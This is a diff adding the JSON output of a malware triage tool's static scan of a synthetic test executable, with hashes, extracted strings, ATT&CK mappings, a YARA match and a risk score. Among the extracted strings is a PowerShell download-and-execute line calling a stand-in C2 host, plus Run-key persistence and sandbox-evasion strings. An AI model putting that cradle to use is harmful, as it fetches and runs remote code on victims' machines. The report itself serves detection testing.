@@ -1,0 +1,602 @@
+{
+  "schema_version": "4.0",
+  "tool": "MAL",
+  "tool_version": "4.0",
+  "generated_at": "2026-10-26T05:51:09+00:00",
+  "mode": "file",
+  "sample": {
+    "name": "sample.exe",
+    "path": "C:\\Users\\DELL\\Videos\\files\\MAL_v4\\MAL_v4\\sample.exe",
+    "type": "PE / Windows executable",
+    "kind": "pe",
+    "size": 414,
+    "created": "2026-08-24T19:18:04",
+    "modified": "2026-08-25T00:48:23",
+    "md5": "1a0e2aa3992d5a4670ab98199cac017b",
+    "sha1": "0c89fe69ab5027a33ffa570029251ad7b7bda3c4",
+    "sha256": "8b8dae5fa669170620abe75308730d3f9db6ef54eee96ae6af3f8688e0702d0c",
+    "sha3_256": "484e4c82dc98c37ee1b0599d6f7b58c618389fe70b30402b1574fd132dd86920",
+    "ssdeep": "6:yYfFIbgXSazD5C0RAWk8LSae2xKXJKFWHSUIYtuH1jhZALozX1MiHJoqz7:rF3Jc0RA022+JeWHSVVjhS8BHHJog7",
+    "tlsh": "T188E0C045F5AAC1641D82018095690B39D69F63EC206160F0CADBCB05BC1765D70F815D",
+    "entropy": 5.041296,
+    "entropy_map": [
+      1.5,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      -0.0,
+      2.0,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      1.5,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      1.5,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      1.5,
+      2.0,
+      1.5,
+      1.5,
+      2.0,
+      2.0,
+      2.0,
+      2.0
+    ]
+  },
+  "strings": [
+    "This is a synthetic test file, not real malware.",
+    "IEX(New-Object Net.WebClient).DownloadString('http://c2.evil-test.example.com/payload')",
+    "-EncodedCommand FromBase64String",
+    "Suspicious IP for testing: 203.0.113.77",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FakeTestPersistence",
+    "VBoxService.exe SbieDll.dll sandbox artifact strings for anti-vm testing"
+  ],
+  "string_count": 6,
+  "iocs": {
+    "urls": [],
+    "domains": [],
+    "ips": [
+      "203.0.113.77"
+    ],
+    "emails": [],
+    "file_paths": [],
+    "registry": [
+      "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FakeTestPersistence"
+    ],
+    "mutexes": [],
+    "pipes": [],
+    "pdb_paths": [],
+    "crypto": [],
+    "hashes": [],
+    "_suppressed_benign": [
+      "c2.evil-test.example.com",
+      "http://c2.evil-test.example.com/payload"
+    ]
+  },
+  "ioc_origin": {
+    "ips|203.0.113.77": "static",
+    "registry|HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FakeTestPersistence": "static"
+  },
+  "capabilities": [
+    {
+      "id": "ps_iex",
+      "title": "Dynamic code execution (IEX)",
+      "category": "execution",
+      "weight": 8,
+      "attack": [
+        "T1059.001",
+        "Command and Scripting Interpreter: PowerShell",
+        "Execution"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "IEX("
+    },
+    {
+      "id": "ps_cradle",
+      "title": "Remote content download cradle",
+      "category": "network",
+      "weight": 8,
+      "attack": [
+        "T1105",
+        "Ingress Tool Transfer",
+        "Command and Control"
+      ],
+      "count": 2,
+      "sources": [
+        "strings"
+      ],
+      "example": "Net.WebClient"
+    },
+    {
+      "id": "ps_reflect",
+      "title": "Reflective / in-memory .NET loading",
+      "category": "obfuscation",
+      "weight": 8,
+      "attack": [
+        "T1620",
+        "Reflective Code Loading",
+        "Defense Evasion"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "FromBase64String"
+    },
+    {
+      "id": "reg_run",
+      "title": "Registry Run key",
+      "category": "persistence",
+      "weight": 9,
+      "attack": [
+        "T1547.001",
+        "Boot or Logon Autostart: Registry Run Keys / Startup Folder",
+        "Persistence"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "CurrentVersion\\Run"
+    },
+    {
+      "id": "vm_artifacts",
+      "title": "Virtual machine / sandbox artifacts",
+      "category": "anti_analysis",
+      "weight": 6,
+      "attack": [
+        "T1497.001",
+        "Virtualization/Sandbox Evasion: System Checks",
+        "Defense Evasion"
+      ],
+      "count": 2,
+      "sources": [
+        "strings"
+      ],
+      "example": "VBoxService"
+    },
+    {
+      "id": "sandbox_words",
+      "title": "Sandbox keywords",
+      "category": "anti_analysis",
+      "weight": 3,
+      "attack": [
+        "T1497",
+        "Virtualization/Sandbox Evasion",
+        "Defense Evasion"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "sandbox"
+    }
+  ],
+  "combos": [
+    {
+      "id": "combo_dropper",
+      "title": "Download-and-execute cradle",
+      "category": "execution",
+      "weight": 8,
+      "attack": [
+        "T1059.001",
+        "Command and Scripting Interpreter: PowerShell",
+        "Execution"
+      ],
+      "evidence": "ps_cradle, ps_iex"
+    }
+  ],
+  "findings": [
+    {
+      "id": "pe_malformed",
+      "title": "Malformed or truncated PE headers",
+      "detail": "'Invalid e_lfanew value, probably not a PE file'",
+      "weight": 6,
+      "category": "structure",
+      "attack": null,
+      "source": "static"
+    }
+  ],
+  "pe": {
+    "available": true,
+    "findings": [
+      {
+        "id": "pe_malformed",
+        "title": "Malformed or truncated PE headers",
+        "detail": "'Invalid e_lfanew value, probably not a PE file'",
+        "weight": 6,
+        "category": "structure",
+        "attack": null,
+        "source": "static"
+      }
+    ],
+    "error": "'Invalid e_lfanew value, probably not a PE file'"
+  },
+  "elf": null,
+  "office": null,
+  "pdf": null,
+  "archive": null,
+  "deobfuscation": {
+    "layers": [],
+    "carved_pe": [],
+    "embedded_pe": [],
+    "xor": {
+      "hits": [],
+      "pe": [],
+      "truncated": false
+    }
+  },
+  "yara": {
+    "enabled": true,
+    "matches": [
+      {
+        "rule": "MAL_PowerShell_Download_Cradle",
+        "namespace": "r1_mal_default",
+        "tags": [],
+        "description": "PowerShell download-and-execute cradle",
+        "strings": [
+          "$dl @ 0x7c",
+          "$ex @ 0x6d"
+        ]
+      }
+    ],
+    "error": null,
+    "rules_loaded": 2
+  },
+  "intel": {
+    "enabled": true,
+    "requested": [
+      "vt",
+      "mb",
+      "urlhaus",
+      "threatfox",
+      "otx",
+      "ha",
+      "abuseipdb"
+    ],
+    "providers": {
+      "vt": {
+        "provider": "vt",
+        "label": "VirusTotal",
+        "status": "not_found"
+      },
+      "mb": {
+        "provider": "mb",
+        "label": "MalwareBazaar",
+        "status": "not_found"
+      },
+      "urlhaus": {
+        "provider": "urlhaus",
+        "label": "URLhaus",
+        "status": "not_found"
+      },
+      "threatfox": {
+        "provider": "threatfox",
+        "label": "ThreatFox",
+        "status": "not_found"
+      },
+      "otx": {
+        "provider": "otx",
+        "label": "AlienVault OTX",
+        "status": "not_found",
+        "pulse_count": 0,
+        "pulses": [],
+        "families": [],
+        "attack_ids": [],
+        "tags": [],
+        "permalink": "https://otx.alienvault.com/indicator/file/8b8dae5fa669170620abe75308730d3f9db6ef54eee96ae6af3f8688e0702d0c"
+      },
+      "ha": {
+        "provider": "ha",
+        "label": "Hybrid Analysis",
+        "status": "not_found"
+      },
+      "abuseipdb": {
+        "provider": "abuseipdb",
+        "label": "AbuseIPDB",
+        "status": "skipped",
+        "error": "Network-only provider; use --enrich to query IPs."
+      }
+    },
+    "network": {},
+    "enrichment_enabled": true,
+    "queried_with": {
+      "hash_lookup": [
+        "vt",
+        "mb",
+        "urlhaus",
+        "threatfox",
+        "otx",
+        "ha"
+      ],
+      "note": "File hashes AND the listed domains/IPs extracted from the sample were sent to the selected providers.",
+      "enrich_ips": [],
+      "enrich_domains": []
+    },
+    "summary": {
+      "verdict": "not_found",
+      "providers_ok": [],
+      "providers_not_found": [
+        "vt",
+        "mb",
+        "urlhaus",
+        "threatfox",
+        "otx",
+        "ha"
+      ],
+      "providers_failed": [],
+      "providers_skipped": [
+        "abuseipdb"
+      ],
+      "hits": [],
+      "vt_malicious": 0,
+      "vt_suspicious": 0,
+      "vt_total": 0,
+      "ha_verdict": "",
+      "ha_threat_score": null,
+      "families": [],
+      "first_seen": null,
+      "observed_techniques": [],
+      "network_flagged": 0
+    },
+    "elapsed_s": 2.1
+  },
+  "attack": [
+    {
+      "technique_id": "T1059.001",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "evidence": [
+        "Dynamic code execution (IEX)",
+        "Download-and-execute cradle"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1547.001",
+      "name": "Boot or Logon Autostart: Registry Run Keys / Startup Folder",
+      "tactic": "Persistence",
+      "evidence": [
+        "Registry Run key"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1497",
+      "name": "Virtualization/Sandbox Evasion",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "Sandbox keywords"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1497.001",
+      "name": "Virtualization/Sandbox Evasion: System Checks",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "Virtual machine / sandbox artifacts"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1620",
+      "name": "Reflective Code Loading",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "Reflective / in-memory .NET loading"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "evidence": [
+        "Remote content download cradle"
+      ],
+      "sources": [
+        "static"
+      ]
+    }
+  ],
+  "risk": {
+    "score": 66,
+    "level": "HIGH",
+    "confidence": "HIGH",
+    "categories": {
+      "execution": 16,
+      "network": 10,
+      "persistence": 9,
+      "injection": 0,
+      "obfuscation": 8,
+      "evasion": 0,
+      "anti_analysis": 9,
+      "credential_access": 0,
+      "collection": 0,
+      "impact": 0,
+      "structure": 6,
+      "reputation": 6,
+      "ioc": 2
+    },
+    "reasons": [
+      {
+        "category": "persistence",
+        "indicator": "reg_run",
+        "points": 9,
+        "evidence": "Registry Run key (x1, via strings; e.g. 'CurrentVersion\\\\Run')",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "ps_iex",
+        "points": 8,
+        "evidence": "Dynamic code execution (IEX) (x1, via strings; e.g. 'IEX(')",
+        "source": "static"
+      },
+      {
+        "category": "network",
+        "indicator": "ps_cradle",
+        "points": 8,
+        "evidence": "Remote content download cradle (x2, via strings; e.g. 'Net.WebClient')",
+        "source": "static"
+      },
+      {
+        "category": "obfuscation",
+        "indicator": "ps_reflect",
+        "points": 8,
+        "evidence": "Reflective / in-memory .NET loading (x1, via strings; e.g. 'FromBase64String')",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "combo_dropper",
+        "points": 8,
+        "evidence": "Download-and-execute cradle [ps_cradle, ps_iex]",
+        "source": "static"
+      },
+      {
+        "category": "anti_analysis",
+        "indicator": "vm_artifacts",
+        "points": 6,
+        "evidence": "Virtual machine / sandbox artifacts (x2, via strings; e.g. 'VBoxService')",
+        "source": "static"
+      },
+      {
+        "category": "structure",
+        "indicator": "pe_malformed",
+        "points": 6,
+        "evidence": "Malformed or truncated PE headers: 'Invalid e_lfanew value, probably not a PE file'",
+        "source": "static"
+      },
+      {
+        "category": "reputation",
+        "indicator": "yara_match",
+        "points": 6,
+        "evidence": "MAL_PowerShell_Download_Cradle",
+        "source": "static"
+      },
+      {
+        "category": "anti_analysis",
+        "indicator": "sandbox_words",
+        "points": 3,
+        "evidence": "Sandbox keywords (x1, via strings; e.g. 'sandbox')",
+        "source": "static"
+      },
+      {
+        "category": "network",
+        "indicator": "network_ioc",
+        "points": 2,
+        "evidence": "0 URL(s), 0 domain(s), 1 IP(s)",
+        "source": "static"
+      },
+      {
+        "category": "ioc",
+        "indicator": "embedded_iocs",
+        "points": 2,
+        "evidence": "2 extracted indicator(s)",
+        "source": "static"
+      }
+    ],
+    "verdict_note": "Score = sum of capped category totals (max 100). Each indicator counts once; repetition is shown as evidence only."
+  },
+  "analysis_limits": {
+    "execution": false,
+    "max_file_mb": 100,
+    "dynamic_behavior": "not collected by MAL (sandbox behaviour, if shown, comes from third-party intel)",
+    "xor_scan_bytes": 16777216,
+    "notes": [
+      "Authenticode signatures are detected but not cryptographically validated.",
+      "Only single-byte XOR is brute-forced; multi-byte / rolling XOR and custom crypto are not decoded.",
+      "Archives (.7z/.rar/.iso) are identified but their members are not inspected."
+    ]
+  }
+}
